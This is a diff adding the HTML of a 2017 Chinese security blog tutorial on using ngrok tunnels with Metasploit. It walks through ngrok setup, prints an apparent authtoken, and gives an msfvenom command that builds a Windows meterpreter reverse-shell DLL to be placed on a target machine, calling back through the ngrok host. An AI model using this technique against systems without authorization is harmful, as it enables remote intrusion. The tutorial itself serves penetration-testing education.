@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Ngrok加Metasploit实现内网穿透 | sky666sec&#39;s blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="keywords" content="Metasploit">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Ngrok加Metasploit实现内网穿透">
+<meta property="og:url" content="http://yoursite.com/2017/12/16/Ngrok加Metasploit实现内网穿透/index.html">
+<meta property="og:site_name" content="sky666sec&#39;s blog">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006Y6f53gy1fnlujkpcttj30jz09bt9z.jpg">
+<meta property="og:image" content="https://i.imgur.com/t5PHWUU.png">
+<meta property="og:image" content="https://i.imgur.com/vXLf7Nc.png">
+<meta property="og:image" content="https://i.imgur.com/euXlQ9K.png">
+<meta property="og:image" content="https://i.imgur.com/44jOhtG.png">
+<meta property="og:image" content="https://i.imgur.com/fQ3EUYY.png">
+<meta property="og:image" content="https://i.imgur.com/xSyAcEh.png">
+<meta property="og:image" content="https://i.imgur.com/2Ne8Jk5.png">
+<meta property="og:image" content="https://i.imgur.com/dHDnZh5.png">
+<meta property="og:image" content="https://i.imgur.com/5j32G17.png">
+<meta property="og:image" content="https://i.imgur.com/FSzXSD2.png">
+<meta property="og:image" content="https://i.imgur.com/0yJPBDQ.png">
+<meta property="og:image" content="https://i.imgur.com/wbepUhs.png">
+<meta property="og:image" content="https://i.imgur.com/jzaOSIv.png">
+<meta property="og:image" content="https://i.imgur.com/hmIDtin.png">
+<meta property="og:updated_time" content="2018-08-05T06:36:17.521Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Ngrok加Metasploit实现内网穿透">
+<meta name="twitter:image" content="https://ws1.sinaimg.cn/large/006Y6f53gy1fnlujkpcttj30jz09bt9z.jpg">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/plugin/bganimation/bg.css">
+  
+
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <div class="outer">
+        <div class="widget-wrap mobile-header">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="https://avatars0.githubusercontent.com/u/24877695?s=460&amp;v=4">
+    <h2 class="author">sky666</h2>
+    <h3 class="description"></h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>41</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>8</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>9</strong><br>标签</div></a>
+    </div>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+          <a href="/about" title="About">
+            <li>关于</li>
+          </a>
+        
+          <a href="/atom.xml" title="rss">
+            <li>rss</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+        <section id="main"><article id="post-Ngrok加Metasploit实现内网穿透" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/12/16/Ngrok加Metasploit实现内网穿透/" class="article-date">
+  <time class="post-time" datetime="2017-12-16T04:00:15.000Z" itemprop="datePublished">
+    <span class="post-month">12月</span><br/>
+    <span class="post-day">16</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Ngrok加Metasploit实现内网穿透
+    </h1>
+  
+
+        <div>
+          
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Metasploit/">Metasploit</a>
+  </div>
+
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><img src="https://ws1.sinaimg.cn/large/006Y6f53gy1fnlujkpcttj30jz09bt9z.jpg" alt=""><br><a id="more"></a></p>
+<h4 id="实例讲解"><a href="#实例讲解" class="headerlink" title="实例讲解"></a>实例讲解</h4><h5 id="0x00"><a href="#0x00" class="headerlink" title="0x00."></a>0x00.</h5><p><code>demon</code>之前发了一篇<code>Ngrok&amp;MSF</code>(内网穿)的文章，由于没时间，现在正好有时间过来测试下。</p>
+<p>感谢<code>demon</code>的耐心教导。</p>
+<p>ngrok 是一个反向代理，通过在公共的端点和本地运行的 Web 服务器之间建立一个安全的通道。ngrok 可捕获和分析所有通道上的流量，便于后期分析和重放。</p>
+<p>Ngrok的下载地址:<a href="https://ngrok.com/download" target="_blank" rel="noopener">https://ngrok.com/download</a></p>
+<p>下面以我的Kali Linux 为例子，下载ngrok。<br><img src="https://i.imgur.com/t5PHWUU.png" alt=""></p>
+<p>解压后得出，ngrok包</p>
+<p><img src="https://i.imgur.com/vXLf7Nc.png" alt=""></p>
+<h5 id="0X01"><a href="#0X01" class="headerlink" title="0X01."></a>0X01.</h5><p>我选择将ngrok复制到/bin</p>
+<p><img src="https://i.imgur.com/euXlQ9K.png" alt=""></p>
+<h5 id="0X02-HTTP"><a href="#0X02-HTTP" class="headerlink" title="0X02.HTTP"></a>0X02.HTTP</h5><p><img src="https://i.imgur.com/44jOhtG.png" alt=""></p>
+<h5 id="1-安装你的token"><a href="#1-安装你的token" class="headerlink" title="1.安装你的token"></a>1.安装你的token</h5><p>去<code>ngrok</code>的官网找到你的<code>token</code></p>
+<blockquote>
+<p><code>ngrok  authtoken  6RBm_2CfWq3xAJ3XVK</code></p>
+</blockquote>
+<p>根据官方文档 使用<code>http</code>的时候 使用<code>ngrok http 80</code>(将本地<code>80</code>端口映射到<code>ngrok</code>外网)，比如我们本机开启了<code>80</code>端口（<code>apache</code>）需要映射到外网。<br>开启<code>apache</code>服务<code>80</code>端口</p>
+<p><img src="https://i.imgur.com/fQ3EUYY.png" alt=""></p>
+<p><img src="https://i.imgur.com/xSyAcEh.png" alt=""></p>
+<p>本机中的<code>localhost</code></p>
+<p><img src="https://i.imgur.com/2Ne8Jk5.png" alt=""></p>
+<p>图中可以看到，已将本机的<code>80</code>端口映射到<code>ngrok.io</code>中</p>
+<blockquote>
+<p><code>ngrok http 80</code></p>
+</blockquote>
+<p><img src="https://i.imgur.com/dHDnZh5.png" alt=""></p>
+<p>我们可以来验证下： <code>http://xxxx571a.ngrok.io</code>中是否有映射。</p>
+<p><img src="https://i.imgur.com/5j32G17.png" alt=""></p>
+<p><img src="https://i.imgur.com/FSzXSD2.png" alt=""></p>
+<h5 id="0x03-TCP"><a href="#0x03-TCP" class="headerlink" title="0x03 TCP"></a>0x03 TCP</h5><p>配置完了<code>Ngrok</code> 上个试了下<code>http</code>，我再来试试<code>TCP</code></p>
+<p>我们使用 <code>ngrok</code> 帮助参数 <code>tcp</code></p>
+<p><img src="https://i.imgur.com/0yJPBDQ.png" alt=""></p>
+<p><code>ngrok tcp 6666</code> 将本机的<code>6666</code>映射到<code>ngrok</code>的外网中。</p>
+<p><img src="https://i.imgur.com/wbepUhs.png" alt=""></p>
+<p><br><br><img src="https://i.imgur.com/jzaOSIv.png" alt=""></p>
+<h5 id="0x04-Metasploit"><a href="#0x04-Metasploit" class="headerlink" title="0x04 Metasploit"></a>0x04 Metasploit</h5><pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=(ip填写对应的ngrok对应的ip或者对应的ngrok对应的域名地址也可以) LPORT=(端口填写对应的ngrok的映射的端口) -f dll &gt; /opt/x.dll
+</code></pre><p>放入目标机子上得到反弹</p>
+<p><img src="https://i.imgur.com/hmIDtin.png" alt=""></p>
+<p><strong>总结：</strong></p>
+<ul>
+<li>利用ngrok,我们可以实现内网穿透。 </li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2017/12/16/Ngrok加Metasploit实现内网穿透/" data-id="cjkgwsach000oswvkbu7fytci" class="article-share-link">分享</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Metasploit/">Metasploit</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2017/12/16/Python代码扫盲/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">上一篇</strong>
+      <div class="article-nav-title">
+        
+          Python代码扫盲
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2017/12/16/Metasploit基础命令新手指南/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">下一篇</strong>
+      <div class="article-nav-title">Metasploit基础命令新手指南</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <h1 class="blog-title">sky666sec&#39;s blog</h1>
+    <h2 class="blog-subtitle"></h2>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+          <a href="/about" title="About">
+            <li>关于</li>
+          </a>
+        
+          <a href="/atom.xml" title="rss">
+            <li>rss</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="https://avatars0.githubusercontent.com/u/24877695?s=460&amp;v=4">
+    <h2 class="author">sky666</h2>
+    <h3 class="description"></h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>41</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>8</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>9</strong><br>标签</div></a>
+    </div>
+
+
+
+    <div class="social-link">
+      
+        <a class="hvr-bounce-in" href="http://github.com/sky666sec" target="_blank" title="Github">
+          Github
+        </a>
+      
+    </div>
+
+    <div class="friend-link">
+      <h2>友情链接</h2>
+      
+        <a class="hvr-bounce-in" href="https://exp10it.cn/about/" target="_blank" title="X1r0Z">
+          X1r0Z
+        </a>
+      
+        <a class="hvr-bounce-in" href="http://www.sqlsec.com" target="_blank" title="国光">
+          国光
+        </a>
+      
+        <a class="hvr-bounce-in" href="http:www.ggsec.cn" target="_blank" title="Demon">
+          Demon
+        </a>
+      
+        <a class="hvr-bounce-in" href="https://www.chabug.org" target="_blank" title="chabug">
+          chabug
+        </a>
+      
+        <a class="hvr-bounce-in" href="https://blog.dyboyw.cn" target="_blank" title="小东">
+          小东
+        </a>
+      
+        <a class="hvr-bounce-in" href="https://scholar10.github.io/" target="_blank" title="书呆子">
+          书呆子
+        </a>
+      
+    </div>
+  </div>
+</div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy;2017 - 2018 sky666<br>
+      由<a href="http://hexo.io/" target="_blank">Hexo</a>强力驱动 | 
+      主题-<a href="https://github.com/ShanaMaid/hexo-theme-shana">Shana</a>
+      
+    </div>
+    
+  </div>
+</footer>
+    </div>
+    
+
+<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
+<script>
+new WOW().init();
+</script>   
+
+
+  <link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+  <script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+  <link rel="stylesheet" href="/plugin/galmenu/GalMenu.css">
+  <script src="/plugin/galmenu/GalMenu.js"></script>
+  <div class="GalMenu GalDropDown">
+      <div class="circle" id="gal">
+        <div class="ring">
+          
+            <a href="/" title="" class="menuItem">首页</a>
+          
+            <a href="/tags" title="" class="menuItem">标签</a>
+          
+            <a href="/categories" title="" class="menuItem">分类</a>
+          
+            <a href="/archives" title="" class="menuItem">归档</a>
+          
+            <a href="/about" title="" class="menuItem">关于</a>
+          
+        </div>
+        
+          <audio id="audio" src="#"></audio>
+        
+      </div> 
+</div>
+<div id="overlay" style="opacity: 1; cursor: pointer;"></div>
+  <script type="text/javascript">var items = document.querySelectorAll('.menuItem');
+    for (var i = 0,
+    l = items.length; i < l; i++) {
+      items[i].style.left = (50 - 35 * Math.cos( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%";
+      items[i].style.top = (50 + 35 * Math.sin( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%"
+    }</script>
+<script type="text/javascript">
+  $(document).ready(function() {
+    $('body').GalMenu({
+      'menu': 'GalDropDown'
+    })
+  });
+</script>
+
+  <section class="hidden-xs"> 
+  <ul class="cb-slideshow"> 
+    <li><span>苟利</span></li> 
+    <li><span>国家</span></li> 
+    <li><span>生死以</span></li> 
+    <li><span>岂能</span></li> 
+    <li><span>祸福</span></li> 
+    <li><span>趋避之</span></li> 
+  </ul>
+</section>
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
